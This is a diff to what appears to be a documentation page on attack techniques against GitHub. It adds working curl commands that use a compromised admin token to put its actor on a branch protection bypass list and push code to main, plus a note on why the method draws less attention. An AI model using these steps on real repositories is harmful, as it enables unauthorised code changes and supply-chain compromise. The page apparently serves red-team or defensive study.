@@ -267,8 +267,7 @@ If the token has admin rights, the attacker can perform the following techniques
     - Add actor to bypass list
     - Push code
 
-
-Example (illustrative):
+### Step 1 - Push a named branch rule
 
 ```bash
 curl -X PUT \
@@ -287,6 +286,38 @@ https://api.github.com/repos/testerhats/app-test-public/branches/main/protection
 "restrictions": null
 }'
 ```
+
+### Step 2 — Identify the token actor
+
+```bash
+curl -H "Authorization: token $TOKEN" \
+  -H "Accept: application/vnd.github+json" \
+  https://api.github.com/user
+```
+
+### Step 3 — Add actor to bypass list
+
+```bash
+curl -X PATCH \
+  -H "Authorization: token $TOKEN" \
+  -H "Accept: application/vnd.github+json" \
+  https://api.github.com/repos/<ORG>/<REPO>/branches/main/protection/required_pull_request_reviews \
+  -d '{
+    "bypass_pull_request_allowances": {
+      "users": ["<ACTOR>"],
+      "teams": [],
+      "apps": []
+    }
+  }'
+```
+
+### Step 4 — Push code
+
+```bash
+git push origin main
+```
+
+
 
 ### Diagram
 
@@ -322,6 +353,11 @@ sequenceDiagram
   A->>API: (Optional) Revert protection settings
 
 ```
+
+!!! question "Why it is stealthier?"
+  - No delete operation
+  - Adding new branch protection rule might not look like an attack 
+
 
 ---
 
